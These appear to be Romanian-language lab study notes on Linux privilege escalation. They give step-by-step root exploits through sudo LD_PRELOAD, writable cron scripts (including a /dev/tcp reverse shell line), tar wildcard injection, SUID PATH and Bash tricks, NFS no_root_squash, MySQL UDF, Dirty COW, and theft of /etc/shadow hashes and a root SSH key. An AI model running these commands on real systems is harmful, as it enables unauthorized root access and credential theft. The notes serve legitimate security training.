# Linux Privilege Escalation (PrivEsc)

Privilege Escalation reprezintă exploatarea unei erori de configurare, vulnerabilități sau permisiuni neadecvate pentru a obține drepturi de administrator (`root` / `uid=0`) pornind de la un cont cu permisiuni reduse.

---

---

## 0. Automated Enumeration Scripts (Instrumente de Scanare Automată)

### Concepte Cheie
În loc de executarea manuală a zecilor de comenzi de recunoaștere, se utilizează scripturi automate de auditare a securității locale. Acestea sunt colecții complexe de comenzi Bash care scanează întregul sistem în câteva secunde pentru a evidenția configurări greșite, permisiuni laxe și vulnerabilități de Kernel.

### Instrumente incluse în Laborator (`/home/user/tools/privesc-scripts`)
*   **`linpeas.sh`**: Cel mai avansat script de enumerare, bazat pe un sistem riguros de culori.
*   **`lse.sh` (Linux Smart Enumeration)**: Unealtă axată pe niveluri de detaliu (0-2), ideală pentru a filtra rapid doar erorile critice de configurare.
*   **`LinEnum.sh`**: Un script clasic de verificare, stabil și curat.

### Metodologie de Utilizare

1. **Oferirea drepturilor de execuție:**
   ```bash
   cd /home/user/tools/privesc-scripts
   chmod +x linpeas.sh
   ```

2. **Rularea cu salvarea output-ului în directorul temporar (pentru analiză facilă):**
   ```bash
   ./linpeas.sh > /tmp/linpeas.txt
   ```

3. **Inspectarea rezultatelor folosind culorile native prin paginator:**
   ```bash
   less -r /tmp/linpeas.txt
   ```

---

## 1. Recunoaștere Sudo & Arbitrary File Read

### Inspectarea privilegiilor curente
`sudo -l`
* Listează binarele pe care utilizatorul curent le poate rula cu drepturi de root (definite în `/etc/sudoers`).
* Referință rapidă pentru metode de evadare: https://gtfobins.github.io

### Citirea fișierelor arbitrare prin Apache2
Dacă utilizatorul poate executa `apache2` via `sudo`, parametrul `-f` (specificare fișier de configurare alternativ) forțează citirea fișierelor restricționate:
`sudo apache2 -f /etc/shadow`
* **Mecanism:** Apache deschide fișierul protejat ca root. Când întâlnește prima linie invalidă pentru sintaxa sa web, oprește execuția și afișează conținutul acelei linii în mesajul de eroare (`Syntax error ... Invalid command 'root:$6$...'`), dezvăluind hash-ul parolei pe ecran.

---

## 2. Weak File Permissions (/etc/shadow & /etc/passwd)

### Generare Hash Linux compatibil (SHA-512 crypt)
* Folosind OpenSSL: `openssl passwd -6 'ParolaAleasa'`
* Folosind mkpasswd: `mkpasswd -m sha-512 'ParolaAleasa'`

### Exploatare /etc/shadow modificabil (World-Writable)
Fișierul are o structură strictă de 9 câmpuri separate prin `:`:
`user:hash:lastchanged:min:max:warn:inactive:expire:reserved`

* **Pași:**
  1. Se generează hash-ul noii parole.
  2. Se editează fișierul și se înlocuiește **exclusiv câmpul 2** (între primul și al doilea `:`), păstrând toți ceilalți delimitatori:
     `root:$6$noul_hash...:18750:0:99999:7:::`
  3. Autentificare: `su root` folosind noua parolă.

### Exploatare /etc/passwd modificabil (World-Writable)
* În linia standard `root:x:0:0:root:/root:/bin/bash`, caracterul `x` instruiește sistemul să caute hash-ul parolei în `/etc/shadow`.
* **Bypass:** Înlocuirea directă a caracterului `x` cu un hash generat determină sistemul să verifice parola exclusiv din `/etc/passwd`, ignorând complet `/etc/shadow`:
  `root:$6$noul_hash...:0:0:root:/root:/bin/bash`
* **Notă de integritate:** Păstrează numele `root` intact; redenumirea contului împiedică utilitare precum `sudo` să funcționeze (`sudo: unknown user: root`).

---

## 3. Password Cracking (John the Ripper)

* **Concept:** Hashing-ul este o operație unidirecțională (one-way). John the Ripper nu decriptează hash-uri, ci realizează un atac pe bază de dicționar (*dictionary attack*): calculează hash-ul fiecărui cuvânt din listă și compară rezultatul cu hash-ul țintă până la potrivire.

### Pregătire Dicționar (Kali Linux)
`sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`

### Rulare Atac
* Executare dicționar pe fișierul cu hash-ul extras:
  `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
* Afișare credențiale identificate:
  `john --show hash.txt`

---

## 4. MySQL UDF (User-Defined Functions) Exploitation

Condiții preliminare: serviciul MySQL rulează ca `root` și permite autentificarea locală neparolată (`mysql -u root`).

### 1. Compilare Exploit (raptor_udf2.c)
* Compilare Position Independent Code (-fPIC):
  `gcc -g -c raptor_udf2.c -fPIC`
* Generare Shared Object (.so) cu SONAME definit:
  `gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`

### 2. Încărcare bibliotecă în MySQL
* `use mysql;`
* `create table foo(line blob);`
* `insert into foo values(load_file('/tmp/raptor_udf2.so'));`
* `select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`
* `create function do_system returns integer soname 'raptor_udf2.so';`

### 3. Creare Shell SUID & Escaladare
* În consola MySQL:
  `select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
  `exit;`
* În terminalul bash:
  `/tmp/rootbash -p`
* Curățare artefacte:
  `rm /tmp/rootbash`
  `exit`

---

## 5. Sudo Environment Variables (LD_PRELOAD)

### Mecanism & Vulnerabilitate
La rularea `sudo -l`, dacă în secțiunea `env_keep` apare definit:
Defaults    env_keep += LD_PRELOAD

Înseamnă că `sudo` nu curăță variabila de mediu `LD_PRELOAD` la tranziția către administrator. Linker-ul dinamic (`ld.so`) este forțat să încarce biblioteca specificată înaintea oricărei alte biblioteci a programului țintă. Deoarece programul rulează prin `sudo`, codul din biblioteca injectată este executat direct cu privilegii de `root` (`uid=0`).

### Pași de exploatare

1. Compilare fișier Shared Object (.so):
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
* -fPIC: Position Independent Code (necesar pentru biblioteci partajate).
* -shared: Generează fișierul .so.
* -nostartfiles: Omite funcția standard de start (main).

2. Execuție via sudo cu injectare de bibliotecă:
Se poate folosi orice program permis în sudo -l (ex: apache2):
sudo LD_PRELOAD=/tmp/preload.so apache2

3. Verificare privilegii:
id
* Output așteptat: uid=0(root) gid=0(root) groups=0(root)



---

## 6. Cron Jobs PrivEsc & Netcat Listener

### Mecanism & Vulnerabilitate
Task-urile din cron rulează strict cu permisiunile utilizatorului care le deține (al 6-lea câmp din crontab). Dacă un cronjob este deținut de `root`, dar scriptul executat are permisiuni de scriere pentru utilizatori obișnuiți (*world-writable*) sau dacă variabila `PATH` este configurată nesigur, un atacator poate obține execuție de comenzi cu drepturi depline de `root`.

### Inspectare Cron Jobs
cat /etc/crontab
ls -la /etc/cron.*

Structura unei linii din /etc/crontab:
* * * * * root /usr/local/bin/backup.sh
(Minut | Oră | Zi din lună | Lună | Zi din săptămână | Utilizator | Comandă/Script)

### Listener Netcat (nc -nvlp)
Utilitar folosit pe mașina de atac pentru a aștepta o conexiune de intrare (Reverse Shell):
nc -nvlp 4444

Semnificația flag-urilor:
* -n: Numeric-only. Dezactivează rezoluția DNS pentru viteză și stabilitate.
* -v: Verbose. Afișează mesaje despre starea conexiunii (ex: "Connection received...").
* -l: Listen. Pornește modul server/ascultare pentru conexiuni noi.
* -p: Port. Definește numărul portului pe care ascultă listener-ul.

### Metoda 1: Exploatare Script Writable (Permisiuni Slabe)
1. Injectează un payload care creează o copie de bash cu bit SUID:
echo "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash" >> /usr/local/bin/backup.sh

2. Sau injectează un Reverse Shell către listener-ul de pe mașina ta de atac:
echo "bash -i >& /dev/tcp/10.x.x.x/4444 0>&1" >> /usr/local/bin/backup.sh

3. După ce minutul s-a scurs și cron-ul a rulat comanda:
/tmp/rootbash -p
id
* Output așteptat: uid=0(root) gid=0(root) groups=0(root)

### Metoda 2: Cron PATH Hijacking
Apare când în `/etc/crontab` variabila `PATH` începe cu un director la care utilizatorul are acces de scriere (ex: `PATH=/home/user:...`), iar comanda apelată este relativă (ex: `overwrite.sh` în loc de calea completă `/usr/local/bin/overwrite.sh`).

1. Creează scriptul malițios direct în folderul prioritar (/home/user):
cat << 'EOF' > /home/user/overwrite.sh
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF

2. Fă fișierul executabil:
chmod +x /home/user/overwrite.sh

3. Așteaptă rularea cron-ului (sub 1 minut) și rulează binarul cu SUID:
/tmp/rootbash -p
* chmod +xs: Fiind rulat de root, binarul /tmp/rootbash va aparține lui root și va avea SUID setat.
* -p: Privileged mode (împiedică bash să renunțe la privilegiile de root).

4. Curățare artefacte:
rm /tmp/rootbash
exit

---

### Metoda 3: Tar Wildcard Injection

#### Mecanism & Vulnerabilitate
Apare atunci când un cronjob deținut de `root` execută o arhivare folosind caracterul generic `*` (ex: `tar czf /tmp/backup.tar.gz *`):
1. **Shell Globbing:** Înainte de apelul utilitarului `tar`, interpretorul Bash expandează caracterul `*` în lista completă a numelor de fișiere din directorul curent.
2. **Argument Injection:** Numele de fișiere create special care încep cu `--` sunt interpretate de `tar` ca opțiuni de configurare (flags), nu ca fișiere destinate arhivării.

#### Exploatare (Checkpoint Flags)
Utilitarul `tar` include funcționalități de checkpointing ce permit execuția de comenzi:
* `--checkpoint=1`: Declanșează o acțiune la fiecare înregistrare procesată.
* `--checkpoint-action=exec=<payload>`: Execută instrucțiunea specificată cu drepturile procesului părinte (`root`).

#### Pași de reproducere
1. Pregătirea payload-ului pe mașina țintă (exemplu: shell inversat sau binar privilegiat):
   ```bash
   chmod +x /home/user/shell.elf
   ```
2. Crearea fișierelor ce vor acționa ca argumente injectate în comanda `tar`:
   ```bash
   touch /home/user/--checkpoint=1
   touch /home/user/--checkpoint-action=exec=shell.elf

---

## Concept: Reverse Shell

### Definiție & Arhitectură
Un **Reverse Shell** este o tehnică prin care o mașină țintă inițiază o conexiune de rețea outbound (ieșire) către un listener controlat de administrator/atacator, atașând un interpretor de comenzi (`/bin/sh` sau `/bin/bash`) la acel canal de comunicație.

* **Bind Shell (Tradițional):** Ținta deschide un port local și așteaptă conexiuni inbound. Deseori blocat de firewall-uri perimetrice și politici de filtrare a traficului de intrare.
* **Reverse Shell (Inversat):** Ținta acționează drept client și se conectează în exterior. Ocolește politicile standard de ingress firewall și restricțiile impuse de NAT, traficul de ieșire fiind frecvent permis.

---

### Mecanism Intern (Linux I/O & Syscalls)
În arhitectura Unix, „totul este un fișier”, iar fiecare proces utilizează trei descriptori standard de intrare/ieșire:
* `0` — `stdin` (tastatură / intrare)
* `1` — `stdout` (ecran / ieșire normală)
* `2` — `stderr` (ecran / ieșire de eroare)

La nivelul nucleului Linux, un payload de reverse shell execută următorul flux:
1. **`socket()` & `connect()`:** Creează un socket TCP și se conectează la IP-ul și portul listener-ului (obținând un descriptor, de ex. `fd 3`).
2. **`dup2()`:** Duplică descriptorul de socket peste canalele standard (`dup2(fd, 0)`, `dup2(fd, 1)`, `dup2(fd, 2)`). În acest mod, intrarea și ieșirile procesului sunt legate direct la conexiunea de rețea.
3. **`execve()`:** Instanțiază interpretorul de comenzi (`/bin/sh`), care moștenește descriptorii redirecționați. Orice comandă trimisă prin rețea este executată de shell, iar output-ul este transmis înapoi prin socket.

---

### Relația cu Privilege Escalation
În procesul de escaladare a privilegiilor (ex: exploatarea unui Cron Job executat de `root`):
* Dacă binarul de reverse shell este lansat de un proces privilegiat (`UID 0`), procesul fiu (`/bin/sh`) moștenește contextul de securitate al părintelui.
* Listener-ul extern primește astfel o sesiune interactivă direct cu drepturi depline de administrator (`root`).

---


## 7. SUID / SGID Executables

### Concepte Cheie
* **SUID (Set User ID):** Bit de permisiune (`u+s`) care face ca un binar executabil să ruleze cu privilegiile **proprietarului fișierului** (frecvent `root`), nu cu cele ale utilizatorului care îl invocă.
* **SGID (Set Group ID):** Bit de permisiune (`g+s`) similar, care moștenește drepturile **grupului** deținător.
* **Suprafață de Atac:** Dacă un binar SUID deținut de `root` conține o vulnerabilitate (de tip buffer overflow, command injection sau logică de configurare nesigură), un utilizator local poate obține execuție de cod arbitrar direct cu privilegii depline.

---

### Enumerare SUID/SGID pe Sistem

Pentru a identifica toate executabilele care rulează cu permisiuni ridicate:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

---


## 8. SUID Shared Object Injection

### Mecanism & Vulnerabilitate
La pornirea unui binar compilat cu legare dinamică (*dynamic linking*), sistemul apelează încărcătorul dinamic (*dynamic linker/loader*) pentru a identifica și mapa în memorie fișierele de tip Shared Object (`.so`). 

Vulnerabilitatea apare dacă un executabil cu bitul **SUID** (`root`) îndeplinește simultan două condiții:
1. Caută o bibliotecă partajată (`.so`) într-un director controlabil de un utilizator neprivilegiat (de exemplu, o cale relativă sau o locație din `/home/user` definită prin `RPATH`/`RUNPATH`).
2. Biblioteca respectivă lipsește de pe disc, permițând crearea unui fișier arbitrar cu același nume în directorul vizat.

Când binarul este relansat, biblioteca malițioasă este încărcată direct în spațiul de adrese al procesului și rulează sub contextul de securitate al deținătorului binarului (`root`).

---

### Detectare și Enumerare cu `strace`

Pentru a intercepta apelurile de sistem de deschidere și verificare a fișierelor:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

Pentru detalii avansate, citește despre [Utilizarea Strace](/notes/linux/troubleshooting.md#1-monitorizarea-apelurilor-de-sistem-cu-strace).

---


## 9. SUID Executable via PATH Environment Variable

### Mecanism & Vulnerabilitate
Această vulnerabilitate apare atunci când un binar SUID execută o comandă de sistem sau un alt program extern fără a specifica calea absolută către acesta (de exemplu, apelează doar `service apache2 start` în loc de `/usr/sbin/service apache2 start`). 

Deoarece binarul moștenește variabila de mediu `PATH` a utilizatorului curent, sistemul va căuta executabilul în directoarele specificate în `PATH`, de la stânga la dreapta. Un atacator poate manipula această variabilă pentru a forța binarul SUID să ruleze un executabil malițios în locul celui legitim.

### Analiza Binarului și Detectare
1. **Identificarea comportamentului binarului:**
   Rulează executabilul și observă ce alte servicii sau utilitare pare că încearcă să pornească:
   ```bash
   /usr/local/bin/suid-env
   ```

2. **Inspectarea șirurilor de caractere (Strings):**
   Caută comenzi sau apeluri text nesecurizate în interiorul fișierului binar:
   ```bash
   strings /usr/local/bin/suid-env
   ```
   *Dacă observi o linie precum `service apache2 start`, înseamnă că binarul apelează un executabil fără calea sa absolută.*

### Etape de Exploatare (PoC)
Pentru a deturna fluxul de execuție și a obține un shell de `root`:

1. **Crearea falsului executabil:**
   Scrie un cod simplu în C (la `/home/user/tools/suid/service.c`) care spawnează un shell Bash:
   ```c
   int main() {
       setuid(0);
       setgid(0);
       system("/bin/bash");
       return 0;
   }
   ```

2. **Compilarea codului:**
   Compilează fișierul sub numele executabilului apelat de binarul SUID (în acest caz, `service`):
   ```bash
   gcc -o service /home/user/tools/suid/service.c
   ```

3. **Deturnarea variabilei PATH:**
   Adaugă directorul curent (unde se află noul tău executabil `service`) la începutul variabilei `PATH` și rulează binarul SUID:
   ```bash
   PATH=.:\$PATH /usr/local/bin/suid-env
   ```

---

## 10. SUID Executable via Bash Functions (Bash < 4.2-048)

### Mecanism & Vulnerabilitate
Atunci când un binar SUID folosește calea absolută către un executabil extern (de exemplu, `/usr/sbin/service`), atacul clasic prin modificarea variabilei `PATH` este blocat. Totuși, pe versiuni vechi de **Bash (< 4.2-048)**, sistemul poate fi deturnat prin exportul unor funcții malițioase.

Vulnerabilitatea se bazează pe două caracteristici din versiunile vechi de Bash:
1. Permisiunea de a defini o funcție al cărei nume este identic cu o cale absolută de fișier (ex: numele funcției este literal `/usr/sbin/service`).
2. Posibilitatea de a exporta aceste funcții în mediu (`export -f`). Când binarul SUID rulează și invocă un shell în spate, procesul citește funcția din memorie și o execută pe aceasta în locul fișierului real de pe disc.

### Detecție și Verificare
1. **Inspectarea binarului:**
   Verifică dacă executabilul SUID folosește căi absolute pentru apeluri:
   ```bash
   strings /usr/local/bin/suid-env2
   ```

2. **Verificarea versiunii de Bash:**
   Asigură-te că versiunea sistemului permite acest exploit:
   ```bash
   /bin/bash --version
   ```

### Etape de Exploatare (PoC)
Pentru a intercepta apelul binarului SUID și a obține un shell cu privilegii depline:

1. **Definirea funcției cu numele căii absolute:**
   Creează o funcție locală denumită exact ca fișierul apelat de binar. Corpul funcției va lansa un shell Bash. Opțiunea `-p` (*privileged*) este obligatorie pentru a preveni renunțarea automată la drepturile de `root`:
   ```bash
   function /usr/sbin/service { /bin/bash -p; }
   ```

2. **Exportarea funcției în mediu:**
   Fă funcția vizibilă pentru sub-procesele pornite de binarul SUID:
   ```bash
   export -f /usr/sbin/service
   ```

3. **Execuția binarului:**
   Rulează executabilul SUID pentru a declanșa funcția exportată și a obține root shell-ul:
   ```bash
   /usr/local/bin/suid-env2
   ```

---

## 11. SUID Executable via Bash Debugging (SHELLOPTS & PS4)

### Mecanism & Vulnerabilitate
Această tehnică profită de o vulnerabilitate din versiunile de **Bash < 4.4**. Atunci când un binar SUID invocă un shell în spate, un atacator poate forța acel shell să ruleze în modul de depanare (*debugging*) și să execute comenzi arbitrare ca `root` prin intermediul variabilelor de mediu.

Vulnerabilitatea se bazează pe manipularea a două variabile specifice:
1. `SHELLOPTS=xtrace`: Activează modul de urmărire și depanare a execuției (`set -x`), forțând Bash să afișeze un prompt special înaintea fiecărei comenzi rulate.
2. `PS4`: Definește structura acelui prompt de depanare. În versiunile vulnerabile de Bash, conținutul acestei variabile este evaluat prin interpolare de comenzi (`$(...)`). Deoarece binarul apelat rulează cu privilegii SUID de `root`, codul injectat în `PS4` este executat automat cu drepturi administrative supreme.

### Detecție și Verificare
Atacul este fezabil dacă binarul țintă are bitul SUID setat și versiunea de Bash de pe sistem este inferioară versiunii 4.4:
```bash
/bin/bash --version
```

### Etape de Exploatare (PoC)

1. **Injectarea payload-ului și generarea binarului SUID malițios:**
   Rulăm executabilul curățând mediul (`env -i`) și setând variabilele buclucașe. Payload-ul va copia binarul Bash legitim în `/tmp` și îi va aplica bitul SUID:
   ```bash
   env -i SHELLOPTS=xtrace PS4='\$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
   ```

2. **Lansarea shell-ului de root:**
   După ce prima comandă a creat binarul capcană cu drepturi ridicate, executăm noul shell folosind parametrul `-p` pentru a forța păstrarea privilegiilor de `root`:
   ```bash
   /tmp/rootbash -p
   ```

3. **Curățarea urmelor:**
   Pentru a nu lăsa un backdoor SUID periculos în directorul temporar, ștergem fișierul generat imediat după finalizarea testului:
   ```bash
   rm /tmp/rootbash
   exit
   ```

---

## 12. Information Leakage via Shell History Files

### Mecanism & Vulnerabilitate
O eroare frecventă de operare apare atunci când utilizatorii sau administratorii introduc parole direct în linia de comandă (ca argumente transmise unor utilitare precum `mysql`, `ftp`, `ssh` sau scripturi custom), în loc să aștepte promptul securizat de introducere a credențialelor.

Majoritatea shell-urilor (Bash, Zsh) salvează automat istoricul tuturor comenzilor rulate într-un fișier text ascuns din folderul de casă al utilizatorului (ex: `.bash_history` sau `.zsh_history`). Dacă aceste fișiere pot fi citite de un atacator local, acesta poate extrage parole uitate în clar.

### Enumerare și Detectare
Pentru a investiga dacă s-au scurs credențiale în istoricul sesiunilor trecute, se inspectează toate fișierele ascunse de istoric din directorul `home`:

```bash
cat ~/.*history | less
```

*Notă utilă pentru investigație:* Se caută în mod special comenzi de conectare la baze de date (ex: `mysql -uroot -p...`), unde adesea nu există spațiu între opțiunea `-p` și parola introdusă.

### Etape de Exploatare (PoC)

1. **Identificarea parolei expuse:**
   În urma rulării comenzii de vizualizare a istoricului, s-a descoperit o tentativă anterioară de conectare la serverul MySQL care conținea parola contului administrativ de sistem.

2. **Obținerea accesului de root:**
   Folosind parola identificată în istoric, se rulează comanda de schimbare a utilizatorului curent cu cel de `root`:
   ```bash
   su root
   ```

---

## 13. Information Leakage via Configuration Files

### Mecanism & Vulnerabilitate
Fișierele de configurare pentru servicii de rețea (ex: `.ovpn` pentru OpenVPN), conexiuni la baze de date (ex: `config.php`, `wp-config.php`) sau scripturi de automatizare conțin adesea parole în clar (*plaintext*) sau rute către alte fișiere securizate pentru a permite autentificarea automată.

Vulnerabilitatea apare atunci când aceste fișiere sensibile sunt lăsate în directoare comune sau în folderul de casă al unui utilizator (`/home/user`) cu permisiuni de citire mult mai permisive decât ar fi necesar (absența unei restricții de tip `chmod 600`). Orice atacator cu acces local pe sistem poate citi aceste fișiere pentru a extrage secrete sau indicii care duc la compromiterea contului de `root`.

### Enumerare și Detectare
Pentru a identifica fișiere de configurare cu potențiale credențiale în directorul de casă sau în alte locații standard:

1. **Listarea fișierelor din directorul utilizatorului:**
   ```bash
   ls -la /home/user
   ```

2. **Inspectarea conținutului fișierelor suspecte (ex: fișiere VPN sau configurări de servicii):**
   ```bash
   cat /home/user/myvpn.ovpn
   ```

### Etape de Exploatare (PoC)

1. **Identificarea credențialelor sau a referințelor:**
   În urma citirii fișierului `myvpn.ovpn`, s-a descoperit o referință (o cale absolută sau un indiciu direct) către locația unde erau stocate credențialele legitime ale utilizatorului `root`.

2. **Tranziția către contul privilegiat:**
   După obținerea parolei din locația indicată în configurare, se folosește comanda de switch user pentru a obține accesul administrativ:
   ```bash
   su root
   ```

---

## 14. Information Leakage via Exposed SSH Private Keys

### Mecanism & Vulnerabilitate
Autentificarea pe bază de chei SSH folosește o pereche criptografică: o cheie publică (stocată pe server) și o cheie privată (păstrată de utilizator). Cheia privată acționează ca o identitate digitală supremă și oferă acces direct la cont fără a mai solicita o parolă.

Din motive de securitate, o cheie privată trebuie să fie protejată cu permisiuni restrictive (ex: `chmod 600`), fiind accesibilă exclusiv proprietarului ei. Vulnerabilitatea apare atunci când administratorii creează backup-uri nesecurizate sau directoare ascunse în rădăcina sistemului (ex: `/.ssh/`) și lasă cheile private de `root` cu drepturi de citire globale (*world-readable*). Orice utilizator local neprivilegiat poate citi și copia cheia pentru a se autentifica direct ca administrator.

### Enumerare și Detectare

1. **Identificarea directoarelor suspecte în rădăcina sistemului:**
   Verifică prezența fișierelor sau directoarelor ascunse direct în `/`:
   ```bash
   ls -la /
   ```

2. **Inspectarea conținutului directorului SSH expus:**
   Dacă se observă un director precum `/.ssh`, listează fișierele din interior pentru a căuta chei private:
   ```bash
   ls -l /.ssh
   ```
   *Un fișier precum `root_key` sugerează direct deținătorul și scopul acelei chei.*

### Etape de Exploatare (PoC)

1. **Exfiltrarea cheii private:**
   Afișează conținutul cheii pe mașina țintă și copiază textul în întregime (inclusiv liniile de început și sfârșit de tip `-----BEGIN RSA PRIVATE KEY-----`) într-un fișier local de pe mașina de atac (ex: Kali Linux):
   ```bash
   cat /.ssh/root_key
   ```

2. **Securizarea locală a cheii (Obligatoriu):**
   Clienții SSH moderni refuză conexiunea dacă fișierul cheii private are permisiuni prea open. Restricționează accesul pe mașina de atac:
   ```bash
   chmod 600 root_key
   ```

3. **Conectarea prin SSH ca Root:**
   Invocă conexiunea SSH folosind cheia privată. Pe sisteme legacy (mașini de laborator mai vechi), este necesară activarea manuală a algoritmilor criptografici mai vechi prin parametri dedicați:
   ```bash
   ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@<IP_TINTA>
   ```


---

## 15. Privilege Escalation via NFS no_root_squash

### Mecanism & Vulnerabilitate
Serviciul **NFS (Network File System)** permite partajarea de directoare prin rețea. În mod implicit, NFS folosește o măsură de securitate numită **Root Squashing** (`root_squash`). Aceasta transformă automat orice fișier creat de utilizatorul `root` al unei mașini la distanță într-un fișier deținut de utilizatorul neprivilegiat `nobody` pe serverul local, prevenind atacurile.

Vulnerabilitatea apare atunci când în fișierul de configurare `/etc/exports` este definită opțiunea **`no_root_squash`**. Această setare forțează serverul să aibă încredere oarbă în identitatea utilizatorului de la distanță. Dacă un atacator este `root` pe propria mașină de atac (ex: Kali), el poate crea și transfera în directorul partajat un binar căruia să îi aplice bitul SUID. Serverul va păstra proprietarul ca fiind `root` și va menține bitul SUID intact, creând un vector direct de Privilege Escalation pentru utilizatorii locali simpli.

### Enumerare și Detectare
Pe mașina țintă, se verifică fișierul de configurare al partajărilor NFS pentru a identifica directoarele care au protecția dezactivată:
```bash
cat /etc/exports
```
*Căutăm linii care conțin un director accesibil (cum ar fi `/tmp`) urmat de opțiunea `no_root_squash`.*

### Etape de Exploatare (PoC)

1. **Obținerea drepturilor de root local pe mașina de atac:**
   Trecem în modul administrator pe mașina Kali pentru ca serverul de la distanță să ne recunoască drept `root`:
   ```bash
   sudo su
   ```

2. **Montarea directorului partajat:**
   Creeăm un punct de montare local și mapăm folderul vulnerabil al victimei:
   ```bash
   mkdir /tmp/nfs
   mount -o rw,vers=3 <IP_TINTA>:/tmp /tmp/nfs
   ```

3. **Generarea și injectarea binarului SUID:**
   Folosim `msfvenom` pentru a genera un executabil ELF simplu care apelează `/bin/bash -p` și îl salvăm direct în folderul montat:
   ```bash
   msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
   ```

4. **Aplicarea permisiunilor SUID (Pasul Critic):**
   Fiind `root` pe Kali, aplicăm bitul SUID pe fișier. Datorită `no_root_squash`, serverul țintă va salva fișierul pe disc ca fiind deținut de `root`:
   ```bash
   chmod +xs /tmp/nfs/shell.elf
   ```

5. **Execuția pe mașina țintă:**
   Ne întoarcem în terminalul utilizatorului simplu de pe mașina vulnerabilă și rulăm binarul proaspăt generat în `/tmp` pentru a obține root shell-ul:
   ```bash
   /tmp/shell.elf
   ```


---

## 16. Linux Kernel Exploits - Dirty COW (CVE-2016-5195)

### Mecanism & Vulnerabilitate
Spre deosebire de erorile de configurare (permisiuni greșite, SUID sau scurgeri de date), un **Kernel Exploit** profită de o breșă de securitate din însuși nucleul sistemului de operare pentru a forța obținerea de drepturi administrative.

Vulnerabilitatea **Dirty COW** se bazează pe o eroare de sincronizare de tip *Race Condition* în subsistemul de memorie al kernelului Linux, mai exact în mecanismul **Copy-on-Write (COW)**. Atacatorul folosește această slăbiciune pentru a sparge logica de protecție a memoriei, forțând sistemul să scrie modificări direct pe hard disk în fișiere protejate, la care utilizatorul curent are în mod normal drepturi doar de citire (*read-only*). Acest lucru permite unui utilizator local neprivilegiat să modifice sau să înlocuiască orice fișier vital deținut de `root`.

### Enumerare și Detectare
Pentru a identifica dacă versiunea curentă de kernel este vulnerabilă la Dirty COW sau la alte exploit-uri cunoscute, se rulează un utilitar automat de scanare:

```bash
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```
*Scriptul analizează versiunea de kernel raportată de sistem și afișează o listă cu exploit-urile de kernel aplicabile.*

### Etape de Exploatare (PoC)

1. **Compilarea codului sursă:**
   Compilăm codul în C al exploit-ului (`c0w.c`). Opțiunea `-pthread` este obligatorie, deoarece atacul are nevoie de fire de execuție simultane pentru a declanșa eroarea de sincronizare în kernel:
   ```bash
   gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
   ```

2. **Rularea exploit-ului:**
   Executăm binarul compilat. Acesta va folosi bug-ul din kernel pentru a suprascrie executabilul legitim `/usr/bin/passwd` (un binar SUID deținut de root) cu un payload custom care spawnează un shell, salvând în prealabil originalul în `/tmp/bak`:
   ```bash
   ./c0w
   ```
   *Notă: Acest proces poate dura câteva minute până când firele de execuție reușesc să exploateze cu succes memoria.*

3. **Declanșarea shell-ului de root:**
   Invocăm binarul modificat de pe sistem. Rularea lui va executa acum direct payload-ul nostru sub contextul de securitate de root:
   ```bash
   /usr/bin/passwd
   ```

4. **Restaurarea sistemului (Critic):**
   Exploit-urile de kernel pot lăsa sistemul instabil. Pentru a repara binarul de sistem afectat și a nu bloca funcțiile mașinii, restaurăm fișierul original din backup și părăsim shell-ul:
   ```bash
   mv /tmp/bak /usr/bin/passwd
   exit
   ```

